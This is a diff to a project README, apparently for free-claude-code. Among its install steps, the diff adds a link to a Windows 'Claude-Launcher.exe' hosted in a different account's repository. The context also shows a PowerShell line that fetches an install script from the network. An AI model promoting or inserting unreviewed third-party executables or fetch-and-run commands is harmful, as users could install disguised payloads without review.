@@ -66,6 +66,17 @@ irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.
 
 Review the installers at [scripts/install.sh](https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.sh) and [scripts/install.ps1](https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1).
 
+### 🖥️ Windows GUI Launcher (One-Click Installer)
+
+Download the portable launcher — it includes a built-in installer and runs everything in a clean white UI:
+
+**[⬇ Download Claude-Launcher.exe](https://github.com/Grass-usertaken/Claude-For-Free/raw/main/launcher/dist/Claude-Launcher.exe)**
+
+- Automatically installs Git, Node.js, uv, Claude Code CLI, and Free Claude Code if missing
+- Starts `fcc-server` in the background automatically
+- Opens `fcc-claude` inside an embedded terminal with a modern light-themed interface
+- Just double-click and go — no terminal commands needed
+
 ### 2. Start The Proxy
 
 ```bash
